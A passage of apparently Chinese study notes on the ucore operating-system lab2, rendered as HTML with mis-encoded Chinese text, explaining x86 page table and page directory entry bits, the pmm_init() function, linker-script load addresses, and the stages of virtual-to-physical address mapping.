class="hljs-params">-----</span>+<span class="hljs-params">-----</span>+<span class="hljs-params">---</span>+<span class="hljs-params">---</span>+<span class="hljs-params">---</span>+<br></code></pre></div></td></tr></table></figure><ul><li>0 - <strong>P</strong>resent: è¡¨ç¤ºå½“å‰PTEæ‰€æŒ‡å‘çš„ç‰©ç†é¡µé¢æ˜¯å¦é©»ç•™åœ¨å†…å­˜ä¸­</li><li>1 - <strong>W</strong>riteable: è¡¨ç¤ºæ˜¯å¦å…è®¸è¯»å†™</li><li>2 - <strong>U</strong>ser: è¡¨ç¤ºè¯¥é¡µçš„è®¿é—®æ‰€éœ€è¦çš„ç‰¹æƒçº§ã€‚å³User(ring 3)æ˜¯å¦å…è®¸è®¿é—®</li><li>3 - <strong>P</strong>age<strong>W</strong>rite<strong>T</strong>hough: è¡¨ç¤ºæ˜¯å¦ä½¿ç”¨write throughç¼“å­˜å†™ç­–ç•¥</li><li>4 - <strong>P</strong>age<strong>C</strong>ache<strong>D</strong>isable: è¡¨ç¤ºæ˜¯å¦<strong>ä¸å¯¹</strong>è¯¥é¡µè¿›è¡Œç¼“å­˜</li><li>5 - <strong>A</strong>ccess: è¡¨ç¤ºè¯¥é¡µæ˜¯å¦å·²è¢«è®¿é—®è¿‡</li><li>6 - <strong>D</strong>irty: è¡¨ç¤ºè¯¥é¡µæ˜¯å¦å·²è¢«ä¿®æ”¹</li><li>7 - <strong>P</strong>age<strong>S</strong>ize: è¡¨ç¤ºè¯¥é¡µçš„å¤§å°</li><li>8 - <strong>M</strong>ust<strong>B</strong>e<strong>Z</strong>ero: è¯¥ä½å¿…é¡»ä¿ç•™ä¸º0</li><li>9-11 - <strong>Avail</strong>able: ç¬¬9-11è¿™ä¸‰ä½å¹¶æ²¡æœ‰è¢«å†…æ ¸æˆ–ä¸­æ–­æ‰€ä½¿ç”¨ï¼Œå¯ä¿ç•™ç»™OSä½¿ç”¨ã€‚</li><li>12-31 - Offset: ç›®æ ‡<strong>ç‰©ç†</strong>åœ°å€çš„é«˜20ä½ã€‚</li></ul><p><strong>é¡µç›®å½•è¡¨:</strong> </p><img src="https://i.loli.net/2021/11/23/9B45OFTQWedfhw1.png" alt="image-20211123104109784" style="zoom:80%;" /><table><thead><tr><th>Bit Position(s)</th><th>Contents</th></tr></thead><tbody><tr><td>0(P)</td><td>Present: must be 1 to reference a page table</td></tr><tr><td>1(R/W)</td><td>Read/write; if 0,writes may not be allowed to the 4-MByte region controlled by this entry (see Section 4.6)</td></tr><tr><td>2(U/S)</td><td>User/supervisor, if 0, user-mode accesses are not allowed to the 4-MByte region controlled by this entry (see Section 4.6)</td></tr><tr><td>3(PWT)</td><td>Page-level write-through; indirectly determines the memory type used to access the page table referenced by this entry (see Section 4.9)</td></tr><tr><td>4(PCD)</td><td>Page-level cache disable; indirectly determines the memory type used to access the page table referenced by this entry (see Section 4.9)</td></tr><tr><td>5(A)</td><td>Accessed; indicates whether this entry has been used for linear-address translation (see Section 4.8)</td></tr><tr><td>6</td><td>lgnored</td></tr><tr><td>7(PS)</td><td>lf CR4.PSE= 1, must be 0 (otherwise, this entry maps a 4-MByte page; see Table 4-4); otherwise, ignored</td></tr><tr><td>11:8</td><td>lgnored</td></tr><tr><td>31:12</td><td><strong>Physical address</strong> of 4-KByte aligned page table referenced by this entry</td></tr></tbody></table><h3 id="6-å†…å­˜åˆå§‹åŒ–å‡½æ•°pmm-init"><a href="#6-å†…å­˜åˆå§‹åŒ–å‡½æ•°pmm-init" class="headerlink" title="6.å†…å­˜åˆå§‹åŒ–å‡½æ•°pmm_init()"></a>6.å†…å­˜åˆå§‹åŒ–å‡½æ•°pmm_init()</h3><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">void</span></span><br><span class="hljs-function"><span class="hljs-title">pmm_init</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span> </span>&#123;<br>    <span class="hljs-comment">// è£…åœ¨cr3çš„ç‰©ç†åœ°å€</span><br>    boot_cr3 = PADDR(boot_pgdir);<br>    <br>    init_pmm_manager();<br><br>    <span class="hljs-comment">// detect physical memory space in 0~KERNMSIZE, reserve already used memory,</span><br>    <span class="hljs-comment">// then use pmm-&gt;init_memmap to create free page list</span><br>    page_init();<br><br>    <span class="hljs-comment">// some simple check</span><br>    check_alloc_page();<br>    check_pgdir();<br>    <span class="hljs-keyword">static_assert</span>(KERNBASE % PTSIZE == <span class="hljs-number">0</span> &amp;&amp; KERNTOP % PTSIZE == <span class="hljs-number">0</span>);<br><br>    <span class="hljs-comment">// recursively insert boot_pgdir in itself</span><br>    <span class="hljs-comment">// to form a virtual page table at virtual address VPT</span><br>    boot_pgdir[PDX(VPT)] = PADDR(boot_pgdir) | PTE_P | PTE_W;<br><br>    <span class="hljs-comment">// map all physical memory to linear memory with base linear addr KERNBASE</span><br>    <span class="hljs-comment">// linear_addr KERNBASE ~ KERNBASE + KMEMSIZE = phy_addr 0 ~ KMEMSIZE</span><br>    boot_map_segment(boot_pgdir, KERNBASE, KMEMSIZE, <span class="hljs-number">0</span>, PTE_W);<br><br>    <span class="hljs-comment">// map virtual_addr 0 ~ 4G = linear_addr 0 ~ 4G</span><br>    <span class="hljs-comment">// then set kernel stack (ss:esp) in TSS, setup TSS in gdt, load TSS</span><br>    gdt_init();<br><br>    <span class="hljs-comment">//now the basic virtual memory map(see memalyout.h) is established.</span><br>    <span class="hljs-comment">//check the correctness of the basic virtual memory map.</span><br>    check_boot_pgdir();<br>    print_pgdir();<br>    kmalloc_init();<span class="hljs-comment">//just print some words</span><br>&#125;<br></code></pre></div></td></tr></table></figure><h3 id="7-é“¾æ¥è„šæœ¬ä¸åœ°å€æ˜ å°„"><a href="#7-é“¾æ¥è„šæœ¬ä¸åœ°å€æ˜ å°„" class="headerlink" title="7.é“¾æ¥è„šæœ¬ä¸åœ°å€æ˜ å°„"></a>7.é“¾æ¥è„šæœ¬ä¸åœ°å€æ˜ å°„</h3><ul><li><strong>edata[]å’Œ end[]è¿™äº›å˜é‡æ˜¯ldæ ¹æ®kernel.ldé“¾æ¥è„šæœ¬ç”Ÿæˆçš„å…¨å±€å˜é‡ï¼Œè¡¨ç¤ºç›¸åº”æ®µçš„èµ·å§‹åœ°å€æˆ–ç»“æŸåœ°å€ç­‰ï¼Œå®ƒä»¬ä¸åœ¨ä»»ä½•ä¸€ä¸ª.Sã€.cæˆ–.hæ–‡ä»¶ä¸­å®šä¹‰ã€‚</strong> </li><li><strong>é€»è¾‘åœ°å€æˆ–è™šæ‹Ÿåœ°å€æ˜¯å¯æ‰§è¡Œä»£ç åœ¨ç¼–è¯‘çš„æ—¶å€™ç”±é“¾æ¥å™¨ç”Ÿæˆçš„</strong> </li><li>ucoreå†…æ ¸çš„é“¾æ¥åœ°å€==ucoreå†…æ ¸çš„è™šæ‹Ÿåœ°å€ï¼›boot loaderåŠ è½½ucoreå†…æ ¸ç”¨åˆ°çš„åŠ è½½åœ°å€==ucoreå†…æ ¸çš„ç‰©ç†åœ°å€ã€‚</li><li><a href="https://chyyuu.gitbooks.io/ucore_os_docs/content/lab2/lab2_3_7_phymemlab_concepts.html">-&gt;è¯¦è§å®éªŒæŒ‡å¯¼ä¹¦&lt;-</a> </li></ul><h4 id="åœ°å€æ˜ å°„çš„å››ä¸ªé˜¶æ®µ"><a href="#åœ°å€æ˜ å°„çš„å››ä¸ªé˜¶æ®µ" class="headerlink" title="åœ°å€æ˜ å°„çš„å››ä¸ªé˜¶æ®µ"></a>åœ°å€æ˜ å°„çš„å››ä¸ªé˜¶æ®µ</h4><p>åœ¨lab2ä¸­ï¼Œä¸ºäº†å»ºç«‹æ­£ç¡®çš„åœ°å€æ˜ å°„å…³ç³»ï¼Œldåœ¨é“¾æ¥é˜¶æ®µç”Ÿæˆäº†ucore OSæ‰§è¡Œä»£ç çš„è™šæ‹Ÿåœ°å€ï¼Œè€Œbootloaderä¸ucore OSååŒå·¥ä½œï¼Œé€šè¿‡åœ¨è¿è¡Œæ—¶å¯¹åœ°å€æ˜ å°„çš„ä¸€ç³»åˆ—â€œè…¾æŒªè½¬ç§»â€ï¼Œä»è®¡ç®—æœºåŠ ç”µï¼Œå¯åŠ¨æ®µå¼ç®¡ç†æœºåˆ¶ï¼Œå¯åŠ¨æ®µé¡µå¼ç®¡ç†æœºåˆ¶ï¼Œåœ¨æ®µé¡µå¼ç®¡ç†æœºåˆ¶ä¸‹è¿è¡Œè¿™æ•´ä¸ªè¿‡ç¨‹ä¸­ï¼Œè™šæ‹Ÿåœ°å€åˆ°ç‰©ç†åœ°å€çš„æ˜ å°„äº§ç”Ÿäº†å¤šæ¬¡å˜åŒ–ï¼Œå®ç°äº†æœ€ç»ˆçš„æ®µé¡µå¼æ˜ å°„å…³ç³»ï¼š</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">virt addr = linear addr = phy addr + <span class="hljs-number">0xC0000000</span><br></code></pre></div></td></tr></table></figure><h4 id="æœ€å¼€å§‹-é“¾æ¥è„šæœ¬"><a href="#æœ€å¼€å§‹-é“¾æ¥è„šæœ¬" class="headerlink" title="æœ€å¼€å§‹: é“¾æ¥è„šæœ¬"></a>æœ€å¼€å§‹: é“¾æ¥è„šæœ¬</h4><p>tools/kernel.ldæ–‡ä»¶åœ¨lab1å’Œlab2ä¸­çš„åŒºåˆ«ã€‚åœ¨lab1ä¸­ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs asm">ENTRY(kern_init)<br><br>SECTIONS &#123;<br>            /* Load the kernel at this address: &quot;.&quot; means the current address */<br>            . = 0x100000;<br><br>            .text : &#123;<br>                       *(.text .stub .text.* .gnu.linkonce.t.*)<br>            &#125;<br></code></pre></div></td></tr></table></figure><p>è¿™æ„å‘³ç€åœ¨lab1ä¸­é€šè¿‡ldå·¥å…·å½¢æˆçš„ucoreçš„èµ·å§‹è™šæ‹Ÿåœ°å€ä»0x100000å¼€å§‹ï¼Œæ³¨æ„ï¼šè¿™ä¸ªåœ°å€æ˜¯è™šæ‹Ÿåœ°å€ã€‚ä½†ç”±äºlab1ä¸­å»ºç«‹çš„æ®µåœ°å€æ˜ å°„å…³ç³»ä¸ºå¯¹ç­‰å…³ç³»ï¼Œæ‰€ä»¥ucoreçš„ç‰©ç†åœ°å€ä¹Ÿæ˜¯ä»0x100000å¼€å§‹ï¼Œè€Œucoreçš„å…¥å£å‡½æ•°kern_initçš„èµ·å§‹åœ°å€ã€‚æ‰€ä»¥åœ¨lab1ä¸­è™šæ‹Ÿåœ°å€ã€çº¿æ€§åœ°å€ä»¥åŠç‰©ç†åœ°å€ä¹‹é—´çš„æ˜ å°„å…³ç³»å¦‚ä¸‹ï¼š</p><figure class="highlight nim"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs nim">lab1: virt <span class="hljs-keyword">addr</span> = linear <span class="hljs-keyword">addr</span> = phy <span class="hljs-keyword">addr</span><br></code></pre></div></td></tr></table></figure><p>åœ¨lab2ä¸­ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs asm">ENTRY(kern_entry)<br><br>SECTIONS &#123;<br>            /* Load the kernel at this address: &quot;.&quot; means the current address */<br>            . = 0xC0100000;<br><br>            .text : &#123;<br>                        *(.text .stub .text.* .gnu.linkonce.t.*)<br>            &#125;<br></code></pre></div></td></tr></table></figure><p>è¿™æ„å‘³ç€lab2ä¸­é€šè¿‡ldå·¥å…·å½¢æˆçš„ucoreçš„èµ·å§‹è™šæ‹Ÿåœ°å€ä»0xC0100000å¼€å§‹ï¼Œæ³¨æ„ï¼šè¿™ä¸ªåœ°å€ä¹Ÿæ˜¯è™šæ‹Ÿåœ°å€ã€‚å…¥å£å‡½æ•°ä¸ºkern_entryå‡½æ•°ï¼ˆåœ¨kern/init/entry.Sä¸­ï¼‰ã€‚è¿™ä¸lab1æœ‰å¾ˆå¤§å·®åˆ«ã€‚ä½†å…¶å®åœ¨lab1å’Œlab2ä¸­ï¼ŒbootloaderæŠŠucoreéƒ½æ”¾åœ¨äº†èµ·å§‹ç‰©ç†åœ°å€ä¸º0x100000çš„ç‰©ç†å†…å­˜ç©ºé—´ã€‚<strong>è¿™å®é™…ä¸Šè¯´æ˜äº†ucoreåœ¨lab1å’Œlab2ä¸­é‡‡ç”¨çš„åœ°å€æ˜ å°„ä¸åŒã€‚lab2åœ¨ä¸åŒé˜¶æ®µæœ‰ä¸åŒçš„è™šæ‹Ÿåœ°å€ã€çº¿æ€§åœ°å€ä»¥åŠç‰©ç†åœ°å€ä¹‹é—´çš„æ˜ å°„å…³ç³»ã€‚</strong> </p><p>ä¹Ÿè¯·æ³¨æ„ï¼Œè¿™ä¸ªèµ·å§‹è™šæ‹Ÿåœ°å€çš„å˜åŒ–å…¶å®å¹¶ä¸ä¼šå½±å“ä¸€èˆ¬çš„è·³è½¬å’Œå‡½æ•°è°ƒç”¨ï¼Œå› ä¸ºå®ƒä»¬å®é™…ä¸Šæ˜¯ç›¸å¯¹è·³è½¬ã€‚ä½†æ˜¯ï¼Œå¯¹äºç»å¯¹å¯»å€çš„å…¨å±€å˜é‡çš„å¼•ç”¨ï¼Œå°±éœ€è¦ç”¨REALLOCå®(å³å°†è¦é‡æ–°è®¡ç®—çš„åœ°å€-0xC0100000)è¿›è¡Œä¸€äº›è¿ç®—æ¥ç¡®ä¿åœ°å€æ˜¯æ­£ç¡®çš„ã€‚</p><h4 id="ç¬¬ä¸€ä¸ªé˜¶æ®µ"><a href="#ç¬¬ä¸€ä¸ªé˜¶æ®µ" class="headerlink" title="ç¬¬ä¸€ä¸ªé˜¶æ®µ"></a>ç¬¬ä¸€ä¸ªé˜¶æ®µ</h4><p>ï¼ˆå¼€å¯ä¿æŠ¤æ¨¡å¼ï¼Œåˆ›å»ºå¯åŠ¨æ®µè¡¨ï¼‰æ˜¯bootloaderé˜¶æ®µï¼Œå³ä»bootloaderçš„startå‡½æ•°ï¼ˆåœ¨boot/bootasm.Sä¸­ï¼‰åˆ°æ‰§è¡Œucore kernelçš„kern_entryå‡½æ•°ä¹‹å‰ï¼Œå…¶è™šæ‹Ÿåœ°å€ã€çº¿æ€§åœ°å€ä»¥åŠç‰©ç†åœ°å€ä¹‹é—´çš„æ˜ å°„å…³ç³»ä¸lab1çš„ä¸€æ ·ï¼Œå³ï¼š</p><figure class="highlight nim"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs nim">lab2 stage <span class="hljs-number">1</span>: virt <span class="hljs-keyword">addr</span> = linear <span class="hljs-keyword">addr</span> = phy <span class="hljs-keyword">addr</span><br></code></pre></div></td></tr></table></figure><h4 id="ç¬¬äºŒä¸ªé˜¶æ®µ"><a href="#ç¬¬äºŒä¸ªé˜¶æ®µ" class="headerlink" title="ç¬¬äºŒä¸ªé˜¶æ®µ"></a>ç¬¬äºŒä¸ªé˜¶æ®µ</h4><p>ï¼ˆåˆ›å»ºåˆå§‹é¡µç›®å½•è¡¨ï¼Œå¼€å¯åˆ†é¡µæ¨¡å¼ï¼‰ä»kern_entryå‡½æ•°å¼€å§‹ï¼Œåˆ°pmm_initå‡½æ•°è¢«æ‰§è¡Œä¹‹å‰ã€‚</p><p>ç¼–è¯‘å¥½çš„ucoreè‡ªå¸¦äº†ä¸€ä¸ª**è®¾ç½®å¥½çš„(å°±åœ¨entry.Sé‡Œ, ä¹Ÿä¸çŸ¥é“ä¸ºä»€ä¹ˆè¦è®¾ç½®æˆä¸¤æ®µæ˜ å°„)**é¡µç›®å½•è¡¨å’Œç›¸åº”çš„é¡µè¡¨ï¼Œå°†0~4Mçš„çº¿æ€§åœ°å€ä¸€ä¸€æ˜ å°„åˆ°ç‰©ç†åœ°å€ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs asm">.align PGSIZE<br>__boot_pgdir:<br>.globl __boot_pgdir<br>    # map va 0 ~ 4M to pa 0 ~ 4M (temporary)<br>    .long REALLOC(__boot_pt1) + (PTE_P | PTE_U | PTE_W)<br>    # è¿™ä¸ªå·¦ç§»ä¸¤ä½æ˜¯ä¹˜ä»¥4çš„æ„æ€, å³(PDE *)__boot_pgdir + PDX(KERNBASE), <br>    .space (KERNBASE &gt;&gt; PGSHIFT &gt;&gt; 10 &lt;&lt; 2) - (. - __boot_pgdir) # pad to the PDE of KERNBASE<br>    # map va KERNBASE + (0 ~ 4M) to pa 0 ~ 4M<br>    .long REALLOC(__boot_pt1) + (PTE_P | PTE_U | PTE_W)<br>    .space PGSIZE - (. - __boot_pgdir) # pad to PGSIZE<br><br>.set i, 0<br>__boot_pt1:<br>.rept 1024# repeat 1024 times, a page table<br>    .long i * PGSIZE + (PTE_P | PTE_W)<br>    .set i, i + 1<br>.endr<br></code></pre></div></td></tr></table></figure><p>äº†è§£äº†ä¸€ä¸€æ˜ å°„çš„äºŒçº§é¡µè¡¨ç»“æ„åï¼Œæ¥ä¸‹æ¥å°±è¦ä½¿èƒ½åˆ†é¡µæœºåˆ¶äº†ï¼Œè¿™ä¸»è¦æ˜¯é€šè¿‡å‡ æ¡æ±‡ç¼–æŒ‡ä»¤ï¼ˆåœ¨kern/init/entry.Sä¸­ï¼‰å®ç°çš„ï¼Œä¸»è¦åšäº†ä¸¤ä»¶äº‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs asm"># load pa of boot pgdir<br>movl $REALLOC(__boot_pgdir), %eax<br>movl %eax, %cr3# 1.æŠŠé¡µç›®å½•è¡¨çš„èµ·å§‹åœ°å€å­˜å…¥CR3å¯„å­˜å™¨ä¸­ï¼›<br><br># enable paging<br>movl %cr0, %eax<br>orl $(CR0_PE | CR0_PG | CR0_AM | CR0_WP | CR0_NE | CR0_TS | CR0_EM | CR0_MP), %eax<br>andl $~(CR0_TS | CR0_EM), %eax<br>movl %eax, %cr0# 2.æŠŠcr0ä¸­çš„CR0_PGæ ‡å¿—ä½è®¾ç½®ä¸Šã€‚<br></code></pre></div></td></tr></table></figure><p>æ‰§è¡Œå®Œè¿™å‡ æ¡æŒ‡ä»¤åï¼Œè®¡ç®—æœºç³»ç»Ÿè¿›å…¥äº†åˆ†é¡µæ¨¡å¼ï¼è™šæ‹Ÿåœ°å€ã€çº¿æ€§åœ°å€ä»¥åŠç‰©ç†åœ°å€ä¹‹é—´çš„ä¸´æ—¶æ˜ å°„å…³ç³»ä¸ºï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs asm">lab2 stage 2 before:<br>    virt addr = linear addr = phy addr # çº¿æ€§åœ°å€åœ¨0~4MBä¹‹å†…ä¸‰è€…çš„æ˜ å°„å…³ç³»<br>    virt addr = linear addr = phy addr + 0xC0000000 # çº¿æ€§åœ°å€åœ¨0xC0000000~0xC0000000+4MBä¹‹å†…ä¸‰è€…çš„æ˜ å°„å…³ç³»<br></code></pre></div></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°ï¼Œå…¶å®ä»…ä»…æ¯”ç¬¬ä¸€ä¸ªé˜¶æ®µå¢åŠ äº†ä¸‹é¢ä¸€è¡Œçš„0xC0000000åç§»çš„æ˜ å°„ï¼Œå¹¶ä¸”ä½œç”¨èŒƒå›´ç¼©å°åˆ°äº†0~4Mã€‚åœ¨ä¸‹ä¸€ä¸ªé˜¶æ®µ, ä¼šå°†ä½œç”¨èŒƒå›´ç»§ç»­æ‰©å……åˆ°0~KMEMSIZEã€‚</p><p>å®é™…ä¸Šè¿™ç§æ˜ å°„é™åˆ¶äº†å†…æ ¸çš„å¤§å°ã€‚å½“å†…æ ¸å¤§å°è¶…è¿‡é¢„æœŸçš„4MB ï¼ˆå®é™…ä¸Šæ˜¯3Mï¼Œå› ä¸ºå†…æ ¸ä» 0x100000å¼€å§‹ç¼–å€ï¼‰å°±å¯èƒ½å¯¼è‡´æ‰“å¼€åˆ†é¡µä¹‹åå†…æ ¸crashï¼Œåœ¨æŸäº›è¯•éªŒä¸­ï¼Œä¹Ÿçš„ç¡®å‡ºç°äº†è¿™ç§æƒ…å†µã€‚è§£å†³æ–¹æ³•åŒæ ·ç®€å•ï¼Œå°±æ˜¯æ­£ç¡®å¡«å……æ›´å¤šçš„é¡µç›®å½•é¡¹å³å¯ã€‚</p><p>æ­¤æ—¶çš„å†…æ ¸ï¼ˆEIPï¼‰è¿˜åœ¨0~4Mçš„ä½è™šæ‹Ÿåœ°å€åŒºåŸŸè¿è¡Œï¼Œè€Œåœ¨ä¹‹åï¼Œè¿™ä¸ªåŒºåŸŸçš„è™šæ‹Ÿå†…å­˜æ˜¯è¦ç»™ç”¨æˆ·ç¨‹åºä½¿ç”¨çš„ã€‚ä¸ºæ­¤ï¼Œéœ€è¦ä½¿ç”¨ä¸€ä¸ªç»å¯¹è·³è½¬æ¥ä½¿å†…æ ¸è·³è½¬åˆ°é«˜è™šæ‹Ÿåœ°å€ï¼ˆä»£ç åœ¨kern/init/entry.Sä¸­ï¼‰ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs asm">    # update eip<br>    # now, eip = 0x1.....<br>    leal next, %eax<br>    # set eip = KERNBASE + 0x1.....<br>    jmp *%eax<br>next:<br></code></pre></div></td></tr></table></figure><p>è·³è½¬å®Œæ¯•åï¼Œé€šè¿‡æŠŠboot_pgdir[0]å¯¹åº”çš„ç¬¬ä¸€ä¸ªé¡µç›®å½•è¡¨é¡¹ï¼ˆ0~4MBï¼‰æ¸…é›¶æ¥å–æ¶ˆäº†ä¸´æ—¶çš„é¡µæ˜ å°„å…³ç³»ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs asm"># unmap va 0 ~ 4M, it&#x27;s temporary mapping<br>xorl %eax, %eax<br>movl %eax, __boot_pgdir<br></code></pre></div></td></tr></table></figure><p>æœ€ç»ˆï¼Œç¦»å¼€è¿™ä¸ªé˜¶æ®µæ—¶ï¼Œè™šæ‹Ÿåœ°å€ã€çº¿æ€§åœ°å€ä»¥åŠç‰©ç†åœ°å€ä¹‹é—´çš„æ˜ å°„å…³ç³»ä¸ºï¼š</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">lab2 stage <span class="hljs-number">2</span>: virt addr = linear addr = phy addr + <span class="hljs-number">0xC0000000</span> <span class="hljs-comment"># çº¿æ€§åœ°å€åœ¨0xC0000000~0xC0000000+4MBä¹‹å†…ä¸‰è€…çš„æ˜ å°„å…³ç³»</span><br></code></pre></div></td></tr></table></figure><p>æ€»ç»“æ¥çœ‹ï¼Œè¿™ä¸€é˜¶æ®µçš„ç›®çš„å°±æ˜¯æ›´æ–°æ˜ å°„å…³ç³»çš„åŒæ—¶å°†è¿è¡Œä¸­çš„å†…æ ¸ï¼ˆEIPï¼‰ä»ä½è™šæ‹Ÿåœ°å€â€œè¿ç§»â€åˆ°é«˜è™šæ‹Ÿåœ°å€ï¼Œè€Œä¸é€ æˆä¼¤å®³ã€‚</p><p>ä¸è¿‡ï¼Œè¿™è¿˜ä¸æ˜¯æˆ‘ä»¬æœŸæœ›çš„æ˜ å°„å…³ç³»ï¼Œå› ä¸ºå®ƒä»…ä»…æ˜ å°„äº†0~4MBã€‚å¯¹äºæ®µè¡¨è€Œè¨€ï¼Œä¹Ÿç¼ºå°‘äº†è¿è¡Œucoreæ‰€éœ€çš„ç”¨æˆ·æ€æ®µæè¿°ç¬¦å’ŒTSSï¼ˆæ®µï¼‰æè¿°ç¬¦ç›¸åº”è¡¨é¡¹ã€‚</p><h4 id="ç¬¬ä¸‰ä¸ªé˜¶æ®µ"><a href="#ç¬¬ä¸‰ä¸ªé˜¶æ®µ" class="headerlink" title="ç¬¬ä¸‰ä¸ªé˜¶æ®µ"></a>ç¬¬ä¸‰ä¸ªé˜¶æ®µ</h4><p>ï¼ˆå®Œå–„æ®µè¡¨å’Œé¡µè¡¨ï¼‰ä»pmm_initå‡½æ•°è¢«è°ƒç”¨å¼€å§‹ã€‚pmm_initå‡½æ•°å°†é¡µç›®å½•è¡¨é¡¹è¡¥å……å®Œæˆï¼ˆä»0~4Mæ‰©å……åˆ°0~KMEMSIZEï¼‰ã€‚ç„¶åï¼Œæ›´æ–°äº†æ®µæ˜ å°„æœºåˆ¶ï¼Œä½¿ç”¨äº†ä¸€ä¸ªæ–°çš„æ®µè¡¨ã€‚è¿™ä¸ªæ–°æ®µè¡¨é™¤äº†åŒ…æ‹¬å†…æ ¸æ€çš„ä»£ç æ®µå’Œæ•°æ®æ®µæè¿°ç¬¦ï¼Œè¿˜åŒ…æ‹¬ç”¨æˆ·æ€çš„ä»£ç æ®µå’Œæ•°æ®æ®µæè¿°ç¬¦ä»¥åŠTSSï¼ˆæ®µï¼‰çš„æè¿°ç¬¦ã€‚ç†è®ºä¸Šå¯ä»¥åœ¨ç¬¬ä¸€ä¸ªé˜¶æ®µï¼Œå³bootloaderé˜¶æ®µå°±å°†æ®µè¡¨è®¾ç½®å®Œå…¨ï¼Œç„¶ååœ¨æ­¤é˜¶æ®µç»§ç»­ä½¿ç”¨ï¼Œä½†è¿™ä¼šå¯¼è‡´å†…æ ¸çš„ä»£ç å’Œbootloaderçš„ä»£ç äº§ç”Ÿè¿‡å¤šçš„è€¦åˆï¼Œäºæ˜¯å°±æœ‰äº†ç›®å‰çš„è®¾è®¡ã€‚</p><p>è¿™æ—¶å½¢æˆäº†æˆ‘ä»¬æœŸæœ›çš„è™šæ‹Ÿåœ°å€ã€çº¿æ€§åœ°å€ä»¥åŠç‰©ç†åœ°å€ä¹‹é—´çš„æ˜ å°„å…³ç³»ï¼š</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">lab2 stage <span class="hljs-number">3</span>: virt addr = linear addr = phy addr + <span class="hljs-number">0xC0000000</span><br></code></pre></div></td></tr></table></figure><p>æ®µè¡¨ç›¸åº”è¡¨é¡¹å’ŒTSSä¹Ÿè¢«è®¾ç½®å¦¥å½“ã€‚</p><h3 id="è‡ªæ˜ å°„æœºåˆ¶"><a href="#è‡ªæ˜ å°„æœºåˆ¶" class="headerlink" title="è‡ªæ˜ å°„æœºåˆ¶"></a>è‡ªæ˜ å°„æœºåˆ¶</h3><p><strong>4GBå†…å­˜éƒ½æœ‰ç”¨åˆ°å—?</strong> </p><p>ä¼—æ‰€å‘¨çŸ¥, ä»ç‰©ç†åœ°å€ç©ºé—´ä¸­çš„æ¯ä¸€ä¸ªblockåˆ†é…page 